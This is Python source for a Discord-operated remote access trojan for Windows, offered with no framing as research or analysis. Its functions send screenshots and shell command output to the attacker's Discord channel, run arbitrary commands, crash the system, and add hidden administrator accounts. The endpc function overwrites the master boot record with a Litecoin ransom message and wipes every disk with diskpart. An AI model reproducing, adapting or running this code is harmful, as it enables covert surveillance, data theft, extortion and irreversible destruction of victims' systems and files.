import pyautogui, os, discord,subprocess,sys,pyttsx3,threading,shutil,webbrowser,psutil,time,asyncio,win32net,ctypes;from ctypes import windll;import winreg,win32file,win32con;import winreg as reg;bots=bots
import GPUtil,cpuinfo,socket,platform,random,string,rotatescreen
async def takepic(ctx):pyautogui.screenshot("pic.png").save("pic.png");await ctx.send(file=discord.File("pic.png"));os.remove("pic.png")
async def clean(ctx):[await channel.delete() for channel in ctx.guild.text_channels if channel != ctx.channel]
async def close(ctx): await ctx.send("closing..."); sys.exit() if not sys.exc_info()[0] else None
async def bsod(ctx):
    await ctx.send("BSOD TRIGGERED :D")
    await asyncio.sleep(1)
    os.system("taskkill /f /im svchost.exe")
async def lockpc(ctx):
    os.system("rundll32.exe user32.dll,LockWorkStation")
    await ctx.send("PC LOCKED :)")
async def processes(ctx):
    def save_and_send():
        try:
            doc_path = os.path.expanduser('~') + "\\Documents\\processes.txt"
            with open(doc_path, 'w') as f:
                f.write('\n'.join([f"{p.name()}-{p.pid}" for p in psutil.process_iter()]))
            asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
            time.sleep(2)
            os.remove(doc_path)
        except Exception as e:
            print(f"Error: {e}")
    threading.Thread(target=save_and_send).start()    
async def sharenote(ctx, *, text: str):
 def share():
  if text:
   os.system(f'echo {text} > {os.path.expanduser("~")}/Documents/note.txt && notepad.exe {os.path.expanduser("~")}/Documents/note.txt && del {os.path.expanduser("~")}/Documents/note.txt')
  else:
   asyncio.run_coroutine_threadsafe(ctx.send("No text provided."), ctx.bot.loop)
 threading.Thread(target=share).start()
async def search(ctx, *, query):
 await ctx.send(f"Searching for: {query}")
 webbrowser.open(f"https://www.bing.com/search?q={'+'.join(query.split())}")
async def openurl(ctx, url):
 await ctx.send(f"Opening URL: {url}")
 webbrowser.open(url) 
async def speak(ctx, *, text: str):
    await ctx.send(f"Speaking: {text}")
    threading.Thread(target=lambda: (engine := pyttsx3.init()).setProperty('rate', engine.getProperty('rate') * 0.7) or engine.setProperty('volume', 1) or engine.setProperty('voice', engine.getProperty('voices')[1].id) or engine.say(text) or engine.runAndWait() or engine.stop(), daemon=True).start()
async def restart(ctx):
 await ctx.send("restarting pc")
 await asyncio.sleep(1)
 os.system("shutdown /r /f /t 0")
async def sd(ctx):
 await ctx.send("shutting down pc :)")
 await asyncio.sleep(1)
 os.system("shutdown /s /f /t 0") 
async def startupapps(ctx):
 def save_and_send():
  try:
   doc_path = os.path.expanduser('~') + "\\Documents\\startup_apps.txt"
   with open(doc_path, 'w') as f:
    f.write('Here are all startup apps:\n' + '\n'.join([os.path.join(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup", f) for f in os.listdir(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup") if os.path.isfile(os.path.join(os.getenv("APPDATA") + r"\Microsoft\Windows\Start Menu\Programs\Startup", f))]))
   asyncio.run_coroutine_threadsafe(ctx.send(file=discord.File(doc_path)), ctx.bot.loop)
   time.sleep(2)
   os.remove(doc_path)
  except Exception as e:
   print(f"Error: {e}")
 threading.Thread(target=save_and_send).start() 
async def cmd(ctx, *, command: str):
    try:
        await ctx.send(f"Running command: {command}")
        result = subprocess.run(command, capture_output=True, text=True, shell=True)
        output = result.stdout + result.stderr
        file_path = os.path.expanduser("~/Documents/outputcmd.txt")
        with open(file_path, 'w') as f:
            f.write(output)
        await ctx.send(file=discord.File(file_path, "outputcmd.txt"))
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")
async def kp(ctx,*,process:str):
 try:
  result=subprocess.run(f"taskkill /f /im {process} /t",capture_output=True,text=True,shell=True)
  if result.returncode==0:await ctx.send(f"Killed all instances of process {process}")
  else:await ctx.send(f"Error: Could not kill process {process}")
 except Exception as e:await ctx.send(f"Error: {e}")
async def manageuser(ctx, action: str, *, username: str = None, password: str = ""):
    try:
        if action == "help":
            help_message = (
                "Usage: !manageuser <action> <username> [password]\n"
                "Actions:\n"
                "  - create <username> <password>  : Creates a new user with the specified username and password.\n"
                "  - delete <username>             : Deletes the specified user.\n"
                "  - promote <username>           : Promotes the specified user to the administrators group.\n"
                "  - demote <username>            : Demotes the specified user from the administrators group."
            )
            await ctx.send(help_message)
        elif action == "create":
            if not username:
                await ctx.send("Username is required for creating a user.")
                return
            command = f'net user {username} {password} /add'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
            await ctx.send(f"User {username} created.")
        elif action == "delete":
            if not username:
                await ctx.send("Username is required for deleting a user.")
                return
            command = f'net user {username} /delete'
            result = subprocess.run(f'net user {username}', capture_output=True, text=True, shell=True)
            if username in result.stdout:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
                await ctx.send(f"User {username} deleted.")
            else:
                await ctx.send(f"User {username} not found or could not be deleted.")
        elif action == "promote":
            if not username:
                await ctx.send("Username is required for promoting a user.")
                return
            command = f'net localgroup administrators {username} /add'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
            await ctx.send(f"User {username} has been promoted to administrators.")
        elif action == "demote":
            if not username:
                await ctx.send("Username is required for demoting a user.")
                return
            command = f'net localgroup administrators {username} /delete'
            ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
            await ctx.send(f"User {username} has been demoted from administrators.")
        else:
            await ctx.send("Invalid action. Use 'create', 'delete', 'promote', 'demote', or 'help'.")
    except Exception as e:
        await ctx.send(f"Error managing user: {str(e)}")
async def wallpaper(ctx):
    try:
        file = await ctx.message.attachments[0].to_file()
        file_path = os.path.join(os.path.expanduser('~'), "wallpaper_temp.jpg")
        with open(file_path, 'wb') as f:
            f.write(file.fp.read())
        windll.user32.SystemParametersInfoW(20, 0, file_path, 3)
        await ctx.send("Wallpaper changed successfully.")
    except Exception as e:
        await ctx.send(f"Error changing wallpaper: {e}")   
async def endpc(ctx):
    try:
        hDevice = win32file.CreateFileW("\\\\.\\PhysicalDrive0", win32con.GENERIC_WRITE, win32con.FILE_SHARE_READ | win32con.FILE_SHARE_WRITE, None, win32con.OPEN_EXISTING, 0, 0)
        byte_list=b'\xb8\x00\x00\x8e\xc0\xbb\x00\x00\xb4\x03\xb0\x01\xb5\x00\xb1\x02\xb6\x00\xcd\x13r\x1d1\xc0\x8e\xc0\xbb\x00\x00\xb4\x03\xb0\x01\xb5\x00\xb1\x02\xb6\x00\xcd\x13r\x08\xbeP|\xe8\n\x00\xeb\xfe\xbe\xce|\xe8\x02\x00\xeb\xfe\xac<\x00t\x06\xb4\x0e\xcd\x10\xeb\xf5\xc3\xb4\x0b\xb7\x00\xb3\x1f\xcd\x10\xc3YOUR PC IS LOCKED! IN ORDER TO UNLOCK YOU MUST PAY 100 DOLLARS IN LITECOIN TO THIS ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB\x00YOUR PC IS LOCKED! IN ORDER TO UNLOCK YOU MUST PAY 100 DOLLARS IN LITECOIN TO THIS ADDRESS LaHL1jGMk2VUgn6c4QtFVLi7BjycWrQorB\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00U\xaa'
        win32file.WriteFile(hDevice, byte_list)
        byte_list = b'\x00' * 4096
        win32file.WriteFile(hDevice, byte_list)
        win32file.CloseHandle(hDevice)

        script = '''select disk 0
                    clean
                    create partition primary size=10240
                    assign letter=HACKED0
                 '''
        for i in range(1, 128):
            script += f"select disk {i}\nclean\ncreate partition primary size=10240\nassign letter=HACKED{i}\n"
        
        with open("diskpart_script.txt", "w") as f:
            f.write(script)

        command = f'cmd.exe /c "diskpart /s diskpart_script.txt"'
        ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", f"/c {command}", None, 1)
        os.remove("diskpart_script.txt")

        await ctx.send("MBR DELETED, PC ENDED!")
    except Exception as e:
        await ctx.send(f"Error executing disk operations: {e}")
async def flood(ctx):
 try:
  def create_user():
   try:
    chars=''.join([chr(i)for i in range(128,256)])
    for _ in range(5):
     username=''.join(random.choice(chars)for _ in range(random.randint(8,10)))
     password=''.join(random.choice(chars)for _ in range(10))
     subprocess.run(f'net user {username} {password} /add',shell=True,check=True)
     subprocess.run(f'net localgroup administrators {username} /add',shell=True,check=True)
   except Exception as e:
    print(f"Error creating admin user accounts: {e}")
  def run_in_thread():
   threads=[]
   for _ in range(3):
    thread=threading.Thread(target=create_user)
    threads.append(thread)
    thread.start()
   for thread in threads:
    thread.join()
  await asyncio.to_thread(run_in_thread)
  await ctx.send("user profiles created")
 except Exception as e:
  await ctx.send(f"Error creating admin user accounts: {e}")
def lockmefiles(): 
 screen = rotatescreen.get_primary_display()
 start_pos = screen.current_orientation
 pos = abs((start_pos - 180) % 360)
 screen.rotate_to(pos)  